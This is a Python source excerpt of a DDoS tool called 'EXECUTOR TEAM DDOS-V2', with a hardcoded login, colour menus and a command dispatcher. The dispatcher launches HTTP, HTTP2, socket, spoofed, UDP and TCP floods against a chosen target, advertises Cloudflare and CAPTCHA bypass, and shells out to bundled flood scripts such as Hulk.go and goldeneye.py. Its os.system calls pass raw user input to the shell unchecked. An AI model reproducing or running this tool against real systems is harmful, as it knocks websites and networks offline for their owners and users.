    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mLAYER4   "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mSHOW METHODS LAYER4                  "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mSPECIAL  "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mSHOW METHODS NEW                     "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mTOOLS    "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mSHOW TOOLS                           "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def special():
    clear()
    stdout.write(f"""
\033[1;31;40m███████╗██╗░░██╗███████╗░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░
██╔════╝╚██╗██╔╝██╔════╝██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗
█████╗░░░╚███╔╝░█████╗░░██║░░╚═╝██║░░░██║░░░██║░░░██║░░██║██████╔╝
\033[1;37;40m██╔══╝░░░██╔██╗░██╔══╝░░██║░░██╗██║░░░██║░░░██║░░░██║░░██║██╔══██╗
███████╗██╔╝╚██╗███████╗╚█████╔╝╚██████╔╝░░░██║░░░╚█████╔╝██║░░██║
╚══════╝╚═╝░░╚═╝╚══════╝░╚════╝░░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
                       
                      \33[0;32mS P E C I A L
                         
""")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╔═════════════════════════════════════════════════════╗\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mBOMB     "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mHULK METHODS                         "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mSTRIKE   "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mNEW METHODS                          "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mGOLDEN   "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mGOLDENEYE                            "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mUAMBYPASS"+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mBY PASS CF                           "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mTHREAD   "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mTHREAD-DDOS METHODS                  "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mJAVA     "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mJAVA-DDOS METHODS                    "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def layer7():
    clear()
    stdout.write(f"""
\033[1;31;40m███████╗██╗░░██╗███████╗░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░
██╔════╝╚██╗██╔╝██╔════╝██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗
█████╗░░░╚███╔╝░█████╗░░██║░░╚═╝██║░░░██║░░░██║░░░██║░░██║██████╔╝
\033[1;37;40m██╔══╝░░░██╔██╗░██╔══╝░░██║░░██╗██║░░░██║░░░██║░░░██║░░██║██╔══██╗
███████╗██╔╝╚██╗███████╗╚█████╔╝╚██████╔╝░░░██║░░░╚█████╔╝██║░░██║
╚══════╝╚═╝░░╚═╝╚══════╝░╚════╝░░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
                       
                      \33[0;32mL A Y E R  -  7
                         
""")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╔═════════════════════════════════════════════════════════╗\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mCFB    "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mByPass CF DDOS                         "+Fore.LIGHTCYAN_EX+"   \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mPXCFB  "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mByPass CF DDOS With PROXY           "+Fore.LIGHTCYAN_EX+"      \033[1;31;40m║\n")                  
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mCFREQ  "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mByPass CF, UAM, CAPTCHA, BFM (request)    "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mCFSOC  "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mByPass CF UAM, CAPTCHA, BFM (socket)     "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mPXSKY  "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mBypass Google Project Shield, Vshield,   "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m  "+Fore.LIGHTWHITE_EX+"       "+Fore.LIGHTCYAN_EX+"    "+Fore.LIGHTWHITE_EX+" \33[0;32mDDoS Guard Free, CF NoSec With Proxy     "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mSKY    "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mSky method without proxy                 "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mHTTP2  "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mHTTP 2.0 Request Attack                  "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mPXHTTP2"+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mHTTP 2.0 Request Attack With Proxy       "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mGET    "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mGet Request Attack                       "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mPOST   "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mPost Request Attack                      "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mHEAD   "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mHead Request Attack                      "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mPPS    "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mOnly GET / HTTP/1.1                      "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mSPOOF  "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mHTTP Spoof Socket Attack                 "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mPXSPOOF"+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mHTTP Spoof Socket Attack With Proxy      "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mSOC    "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mSocket Attack                            "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mPXRAW  "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mProxy Request Attack                     "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mPXSOC  "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mProxy Socket Attack                      "+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╚═════════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
def layer4():
    clear()
    stdout.write(f"""
\033[1;31;40m███████╗██╗░░██╗███████╗░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░
██╔════╝╚██╗██╔╝██╔════╝██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗
█████╗░░░╚███╔╝░█████╗░░██║░░╚═╝██║░░░██║░░░██║░░░██║░░██║██████╔╝
\033[1;37;40m██╔══╝░░░██╔██╗░██╔══╝░░██║░░██╗██║░░░██║░░░██║░░░██║░░██║██╔══██╗
███████╗██╔╝╚██╗███████╗╚█████╔╝╚██████╔╝░░░██║░░░╚█████╔╝██║░░██║
╚══════╝╚═╝░░╚═╝╚══════╝░╚════╝░░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
                       
                      \33[0;32mL A Y E R  -  4
                         
""")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╔═════════════════════════════════════════════════════╗\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mUDP    "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mUDP METHODS IP                         "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mTCP    "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mTCP METHOS IP                          "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╚═════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
def tools():
    clear()
    stdout.write(f"""\033[1;31;40m███████╗██╗░░██╗███████╗░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░
██╔════╝╚██╗██╔╝██╔════╝██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗
█████╗░░░╚███╔╝░█████╗░░██║░░╚═╝██║░░░██║░░░██║░░░██║░░██║██████╔╝
\033[1;37;40m██╔══╝░░░██╔██╗░██╔══╝░░██║░░██╗██║░░░██║░░░██║░░░██║░░██║██╔══██╗
███████╗██╔╝╚██╗███████╗╚█████╔╝╚██████╔╝░░░██║░░░╚█████╔╝██║░░██║
╚══════╝╚═╝░░╚═╝╚══════╝░╚════╝░░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
                       
                      \33[0;32mT O O L S 
                         
             \n""")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╔═════════════════════════════════════════════════════╗\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mCHECK "+Fore.LIGHTCYAN_EX+"      >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mCheck IP Address      "+Fore.LIGHTCYAN_EX+"            \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mTRACEROUTE "+Fore.LIGHTCYAN_EX+" >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mTracert IP Address      "+Fore.LIGHTCYAN_EX+"          \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mGEOIP "+Fore.LIGHTCYAN_EX+"      >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mGeo IP Address Lookup"+Fore.LIGHTCYAN_EX+"             \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mDNS   "+Fore.LIGHTCYAN_EX+"      >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mClassic DNS Lookup   "+Fore.LIGHTCYAN_EX+"             \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mSUBNET"+Fore.LIGHTCYAN_EX+"      >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mSubnet IP Address Lookup   "+Fore.LIGHTCYAN_EX+"       \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mREVERSEIP"+Fore.LIGHTCYAN_EX+"   >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mShow VPS Server   "+Fore.LIGHTCYAN_EX+"                \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mASN-LOOKUP"+Fore.LIGHTCYAN_EX+"  >>>"+Fore.LIGHTWHITE_EX+" \33[0;32mASN Lookup Autonomous System (AS)"+Fore.LIGHTCYAN_EX+" \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╚═════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
def login():
    user = "cyber"
    passwd = "dark"
    username = input("""





    
                
                           ⚡ \33[0;32mLOGIN TO DDOS-V2: """)
    password = getpass.getpass(prompt="""                  
                           ⚡ \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""        
                              ☠️ \033[1;31;40mBUY YA SAYANG!!!🚫""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                         ⚡ \33[0;32mWELLCOME TO EXECUTOR TEAM DDOS-V2!""")
        time.sleep(0.3)
def title():
    login()
    os.system("clear")
    stdout.write(f"""
\033[1;31;40m███████╗██╗░░██╗███████╗░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░
██╔════╝╚██╗██╔╝██╔════╝██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗
█████╗░░░╚███╔╝░█████╗░░██║░░╚═╝██║░░░██║░░░██║░░░██║░░██║██████╔╝
\033[1;37;40m██╔══╝░░░██╔██╗░██╔══╝░░██║░░██╗██║░░░██║░░░██║░░░██║░░██║██╔══██╗
███████╗██╔╝╚██╗███████╗╚█████╔╝╚██████╔╝░░░██║░░░╚█████╔╝██║░░██║
╚══════╝╚═╝░░╚═╝╚══════╝░╚════╝░░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
                       
                 \33[0;32mEXECUTOR TEAM DDOS-V2
                         
""")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╔═════════════════════════════════════════════════════╗\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ "+Fore.LIGHTWHITE_EX   +"             \33[0;32mUSING THIS TOOLS BE SMART  "+Fore.LIGHTCYAN_EX   +"            \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ "+Fore.LIGHTWHITE_EX   +"          \33[0;32mTYPE   \033[1;31;40m[ ? ]   \33[0;32mFOR SHOW COMMANDS    "+Fore.LIGHTCYAN_EX +"      \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ "+Fore.LIGHTWHITE_EX   +"         \033[1;31;40mE X E C U T O R  T E A M  C Y B E R   "+Fore.LIGHTCYAN_EX +"     \033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╚═════════════════════════════════════════════════════╝\n")
    print(f"""
    \33[0;32mPLEASE TYPE THIS FOLLOW FOR SHOW COMMAND:
    >>> help or ?
    """)
    stdout.write("\n")
##############################################################################################
def command():
    stdout.write(Fore.LIGHTCYAN_EX+"""\033[1;34;40m┌──(\033[1;31;40mroot㉿localhost\033[1;34;40m)-[\033[1;37;40m/home/kali\033[1;34;40m]
\033[1;34;40m└─\033[1;31;40m# """+Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear":
        clear()
        title()
    elif command == "SPECIAL" or command == "special":
        special()
    elif command == "BOMB" or command == "bomb":
            try:
                target, methods = get_info_sp()
                os.system(f'cd resources && go run Hulk.go -site {target} -data {methods}')
            except IndexError:
                print('Usage: bomb URL METHODS GET/POST')
                print('Example: bomb http://target.com GET')
    elif command == "STRIKE" or command == "strike":
            try:
                target, methods = get_info_sp()
                os.system(f'cd resources && go run strike.go -url {target} {methods}')
            except IndexError:
                print('Usage: URL METHODS GET/POST')
                print('Example: http://target.com GET')
    elif command == "UAMBYPASS" or command == "uambypass" or command == "uam" or command == "UAM":
            try:
                uamtarget, uamtime = get_info_uam()
                os.system(f'cd resources && node uambypass.js {uamtarget} {uamtime} 1250 http.txt')
            except IndexError:
                print('Usage: Input with True Command')
    elif command == "GOLDEN" or command == "golden":
            try:
                gtarget, gworkers, gconnection, gdebug = get_info_gold()
                os.system(f'cd resources && python3 goldeneye.py {gtarget} -w {gworkers} -s {gconnection} -m random -d {gdebug}')
            except IndexError:
                print('Usage: golden URL WORKERS')
                print('Example: golden http://target.com -w 10 -s 500 -m random -d True')
    elif command == "JAVA" or command == "java":
        os.system("cd resources && java ddos.java")
    elif command == "help" or command == "?" or command == "menu" or command == "HELP" or command == "MENU":
        help()   
    elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
        layer7()
    elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
        layer4()
    elif command == "tools" or command == "tool":
        tools()
    elif command == "exit":
        exit()
    elif command == "test":
        target, thread, t = get_info_l7()
        test1(target, thread, t)
        time.sleep(10)
    elif command == "http2" or command == "HTTP2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif command == "pxhttp2" or command == "PXHTTP2":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif command == "cfb" or command == "CFB":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif command == "pxcfb" or command == "PXCFB":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif command == "pps" or command == "PPS":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPPS(target, thread, t)
        timer.join() 
    elif command == "spoof" or command == "SPOOF":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSPOOF(target, thread, t)
        timer.join() 
    elif command == "pxspoof" or command == "PXSPOOF":
        target, thread, t = get_info_l7()
        #timer = threading.Thread(target=countdown, args=(t,))
        #timer.start()
        LaunchPXSPOOF(target, thread, t, get_proxylist("SOCKS5"))
        #timer.join()
        time.sleep(1000)
    elif command == "get" or command == "GET":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif command == "post" or command == "POST":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif command == "head" or command == "HEAD":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif command == "pxraw" or command == "PXRAW":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif command == "soc" or command == "SOC":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif command == "pxsoc" or command == "PXSOC":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif command == "cfreq" or command == "CFREQ":
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif command == "cfsoc" or command == "CFSOC":
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif command == "pxsky" or command == "PXSKY":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif command == "sky" or command == "SKY":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "udp" or command == "UDP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "tcp" or command == "TCP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "THREAD" or command == "thread":
        os.system("cd resources && python3 thread.py")

##############################################################################################     
    elif command == "subnet" or command == "SUBNET":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')                   
            
    elif command == "dns" or command == "DNS":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
            
    elif command == "geoip" or command == "GEOIP":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    elif command == "reverseip" or command == "REVERSEIP":  
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
             r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={target}')
             print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    elif command == "ASN" or command == "ASN-LOOKUP" or command == "asn" or command == "asn-lookup":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
             r = requests.get(f"https://api.hackertarget.com/aslookup/?q={target}")
             print(r.text)
        except:
             print("[ API Error :( ]")
    elif command == "traceroute" or command == "tracert" or command == "TRACEROUTE":  
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
             r = os.system(f'traceroute {target}')
             print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    elif command == "check" or command == "CHECK-IP" or command == "check-ip":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"DOMAIN ex: www.site.com/site.com (don't http/s) "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
             r = os.system(f"nmap {target}")
             print(r.text)
             r1 = os.system(f"whois {target}")
             print(r1.text)
        except:
            print('An error has occurred while sending the request to the API!')
    
    else:
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")
##############################################################################################   

def func():
    stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack with proxy\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
